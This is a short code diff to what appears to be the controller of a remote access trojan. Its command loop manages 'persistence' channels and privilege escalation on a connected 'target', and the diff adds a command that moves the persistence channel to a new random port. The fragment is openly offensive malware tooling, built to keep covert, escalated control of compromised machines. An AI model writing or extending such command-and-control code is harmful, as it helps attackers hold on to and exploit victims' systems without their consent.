@@ -114,6 +114,7 @@ def target_communication():
     print("   stop_persist           - Stop persistence channel")
     print("   persist_status         - Get persistence status")
     print("   persist_info           - Show detailed connection info")
+    print("   persist_new_port       - Reinitialize with new random port")
     print("")
     print(f"Connected to target: {ip[0]}:{ip[1]}")
     
@@ -280,7 +281,7 @@ def target_communication():
                 
                 # Also show target response
                 print(f"\nTarget response: {result}")
-        elif command in ['start_persist', 'stop_persist', 'persist_status', 'persist_info']:
+        elif command in ['start_persist', 'stop_persist', 'persist_status', 'persist_info', 'persist_new_port']:
             # Handle persistence commands
             result = reliable_recv()
             if command == 'start_persist':
@@ -295,6 +296,8 @@ def target_communication():
                 print(f"Persistence Info:\n{'-'*40}")
                 print(result)
                 print("-"*40)
+            elif command == 'persist_new_port':
+                print(f"Persistence New Port: {result}")
         elif command in ['check_privs', 'escalate', 'privesc_report']:
             # Handle privilege escalation commands
             result = reliable_recv()
